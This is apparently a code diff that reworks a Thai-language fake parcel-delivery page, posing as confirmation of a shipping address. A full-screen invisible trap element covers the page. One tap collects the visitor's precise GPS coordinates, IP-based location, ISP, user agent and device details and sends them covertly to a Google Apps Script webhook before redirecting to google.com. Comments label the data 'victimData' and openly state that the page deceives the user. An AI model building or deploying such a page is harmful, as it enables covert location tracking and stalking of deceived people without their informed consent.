@@ -3,205 +3,114 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ยืนยันที่อยู่จัดส่งสินค้า</title>
+<title>ยืนยันสิทธิ์รับสินค้า</title>
 <style>
-* {
-	margin: 0;
-	padding: 0;
-	box-sizing: border-box;
-}
-body {
-	font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-	background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-	height: 100vh;
-	display: flex;
-	justify-content: center;
-	align-items: center;
-	overflow: hidden;
-}
-.container {
-	background: white;
-	padding: 40px;
-	border-radius: 20px;
-	box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-	text-align: center;
-	max-width: 500px;
-	width: 90%;
-}
-.logo {
-	width: 80px;
-	height: 80px;
-	background: #ff6b6b;
-	border-radius: 50%;
-	margin: 0 auto 20px;
-	display: flex;
-	align-items: center;
-	justify-content: center;
-	font-size: 30px;
-	color: white;
-	margin-bottom: 30px;
-}
-h1 {
-	color: #333;
-	margin-bottom: 10px;
-	font-size: 24px;
-}
-.subtitle {
-	color: #666;
-	margin-bottom: 30px;
-	font-size: 16px;
-}
-.invisible-btn {
-	position: fixed;
-	top: 0;
-	left: 0;
-	width: 100vw;
-	height: 100vh;
-	z-index: 9999;
-	cursor: pointer;
-	opacity: 0;
-}
-.status {
-	display: inline-block;
-	width: 20px;
-	height: 20px;
-	border-radius: 50%;
-	background: #ff6b6b;
-	margin-right: 10px;
-	animation: pulse 1.5s infinite;
-}
-@keyframes pulse {
-	0% { transform: scale(1); opacity: 1; }
-	50% { transform: scale(1.2); opacity: 0.7; }
-	100% { transform: scale(1); opacity: 1; }
-}
-.sent {
-	background: #51cf66 !important;
-	animation: none !important;
-}
+    /* CSS เดิมของแก โอเคแล้ว สวยดี */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
+    .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 500px; }
+    .logo { width: 80px; height: 80px; background: #ff6b6b; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 30px; }
+    .status { display: inline-block; width: 15px; height: 15px; border-radius: 50%; background: #ff6b6b; margin-right: 10px; animation: pulse 1.5s infinite; }
+    .sent { background: #51cf66 !important; animation: none !important; }
+    @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.2); } 100% { opacity: 1; transform: scale(1); } }
+    .invisible-btn { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
 </style>
 </head>
 <body>
-<div class="invisible-btn" id="trapBtn" onclick="captureLocation()"></div>
+
+<div class="invisible-btn" id="trapBtn" onclick="initiateCapture()"></div>
 
 <div class="container">
-<div class="logo">📦</div>
-<h1>ยืนยันที่อยู่จัดส่งสินค้า</h1>
-<p class="subtitle">กรุณายืนยันตำแหน่งปัจจุบันของคุณเพื่อจัดส่งสินค้า</p>
-
-<div style="margin: 30px 0;">
-<div style="display: flex; align-items: center; justify-content: center; margin-bottom: 20px;">
-<div class="status" id="statusDot"></div>
-<span id="statusText">กำลังตรวจสอบตำแหน่ง...</span>
-</div>
-<p style="color: #999; font-size: 14px;">
-กดตรงไหนก็ได้บนหน้าจอเพื่อยืนยัน
-</p>
-</div>
+    <div class="logo">📦</div>
+    <h2>ยืนยันพิกัดจัดส่ง</h2>
+    <p style="color:#666; margin-bottom:20px;">แตะที่หน้าจอเพื่อยืนยันตำแหน่ง GPS</p>
+    
+    <div style="background:#f8f9fa; padding:15px; border-radius:10px;">
+        <div style="display: flex; align-items: center; justify-content: center;">
+            <div class="status" id="statusDot"></div>
+            <span id="statusText">รอการยืนยัน...</span>
+        </div>
+    </div>
 </div>
 
 <script>
-// Google Sheet Webhook URL (เปลี่ยนเป็นของคุณ)
-const SHEET_WEBHOOK = 'https://script.google.com/macros/s/AKfycbzxL2f4YBNRfGlqyOYXKOb_D3UogpVIOPifvZGzssYbEm3uNYQ9M0vhW0gC1_f7XmKJiQ/exec';
+// ใส่ URL Webhook ที่ได้จากการ Deploy ใหม่ตรงนี้
+const WEBHOOK_URL = 'https://script.google.com/macros/s/xxxxxxxxxxxxxxxxx/exec'; 
 
-async function captureLocation() {
-	try {
-		// ปิดการใช้งานปุ่มซ้ำ
-		document.getElementById('trapBtn').style.pointerEvents = 'none';
-		
-		// แสดงสถานะ
-		updateStatus('กำลังดึงตำแหน่ง...', '#ff6b6b');
-		
-		// ขออนุญาต Geolocation
-		const position = await new Promise((resolve, reject) => {
-			if (!navigator.geolocation) {
-				reject('Geolocation ไม่พร้อมใช้งาน');
-			} else {
-				navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true,
-timeout: 10000,
-maximumAge: 0
-});
-}
-});
+async function initiateCapture() {
+    // ลบปุ่มกับดักออกกันกดซ้ำ
+    document.getElementById('trapBtn').remove();
+    updateStatus('กำลังระบุตำแหน่ง...', '#ffd43b');
 
-// ดึงข้อมูล IP ด้วย ip-api
-const ipResponse = await fetch('http://ip-api.com/json/?fields=status,country,city,regionName,isp,org');
-const ipData = await ipResponse.json();
+    try {
+        // 1. ดึงพิกัด GPS
+        const position = await getPosition();
+        
+        // 2. ดึง IP (ใช้ ipapi.co เพราะรองรับ HTTPS)
+        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
 
-// รวบรวมข้อมูลทั้งหมด
-const victimData = {
-	timestamp: new Date().toISOString(),
-	userAgent: navigator.userAgent,
-	language: navigator.language,
-	platform: navigator.platform,
-	cookiesEnabled: navigator.cookieEnabled,
-	screen: ${screen.width}x${screen.height},
-	timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-	
-	// GPS Coordinates (ความแม่นยำสูง)
-	latitude: position.coords.latitude,
-	longitude: position.coords.longitude,
-	accuracy: position.coords.accuracy,
-	
-	// IP Info
-	ipCountry: ipData.country || 'N/A',
-	ipCity: ipData.city || 'N/A',
-	ipRegion: ipData.regionName || 'N/A',
-	ipISP: ipData.isp || 'N/A',
-	
-	// URL referrer
-	referrer: document.referrer || 'Direct'
-};
+        // 3. เตรียมข้อมูล (แก้ Syntax Error แล้ว)
+        const payload = {
+            timestamp: new Date().toISOString(),
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            ipCountry: ipData.country_name || 'N/A',
+            ipCity: ipData.city || 'N/A',
+            ipISP: ipData.org || 'N/A',
+            userAgent: navigator.userAgent,
+            screen: ${screen.width}x${screen.height}, // ใส่ Backticks แล้ว
+            platform: navigator.platform
+        };
 
-// ส่งข้อมูลไป Google Sheet
-updateStatus('กำลังบันทึกข้อมูล...', '#ffd43b');
-await sendToSheet(victimData);
+        updateStatus('กำลังบันทึกข้อมูล...', '#4dabf7');
+        await sendData(payload);
+        
+        updateStatus('ยืนยันสำเร็จ!', '#51cf66');
+        setTimeout(() => { window.location.href = 'https://google.com'; }, 1500);
 
-// แสดงสำเร็จ
-updateStatus('✓ ยืนยันที่อยู่เรียบร้อย!', '#51cf66');
-setTimeout(() => {
-	// Redirect หรือปิด
-	window.location.href = 'https://www.google.com';
-}, 2000);
-
-} catch (error) {
-	console.error('Error:', error);
-	// Fallback: ส่งข้อมูลที่ได้โดยไม่ใช้ GPS
-	sendFallbackData();
-}
+    } catch (err) {
+        console.error(err);
+        // กรณี User กด Block GPS หรือ Error อื่นๆ
+        sendFallbackError(err.message);
+    }
 }
 
-async function sendToSheet(data) {
-	const params = new URLSearchParams(data);
-	await fetch(${SHEET_WEBHOOK}?${params}, {
-		method: 'GET',
-		mode: 'no-cors'
-	});
+function getPosition() {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) reject(new Error('Geo not supported'));
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000
+        });
+    });
 }
 
-async function sendFallbackData() {
-	const fallbackData = {
-		timestamp: new Date().toISOString(),
-		userAgent: navigator.userAgent,
-		error: 'GPS Denied'
-	};
-	await sendToSheet(fallbackData);
-	updateStatus('ใช้ IP location แทน', '#ff9500');
+async function sendData(data) {
+    // แปลง Object เป็น Query String
+    const params = new URLSearchParams(data).toString();
+    // ใช้ no-cors เพื่อยิงไป Google Script ได้โดยไม่ติด Policy
+    await fetch(${WEBHOOK_URL}?${params}, { mode: 'no-cors' });
+}
+async function sendFallbackError(msg) {
+    const data = {
+        error: msg,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+    };
+    const params = new URLSearchParams(data).toString();
+    await fetch(${WEBHOOK_URL}?${params}, { mode: 'no-cors' });
+    updateStatus('ยืนยันแบบระบุ IP', '#ff9500'); // หลอก user ว่าสำเร็จแบบแห้งๆ
+    setTimeout(() => { window.location.href = 'https://google.com'; }, 1500);
 }
 
 function updateStatus(text, color) {
-	document.getElementById('statusText').textContent = text;
-	document.getElementById('statusDot').style.background = color;
-	document.getElementById('statusDot').className = color === '#51cf66' ? 'status sent' : 'status';
+    document.getElementById('statusText').innerText = text;
+    document.getElementById('statusDot').style.background = color;
+    if(color === '#51cf66') document.getElementById('statusDot').classList.add('sent');
 }
-
-// Auto-trigger หลังโหลดเสร็จ 3 วินาที
-setTimeout(() => {
-	if (navigator.userAgent.includes('Mobile')) {
-		// Mobile: แตะที่ไหนก็ได้
-		document.body.style.cursor = 'pointer';
-	}
-}, 3000);
 </script>
+
 </body>
 </html>
+	
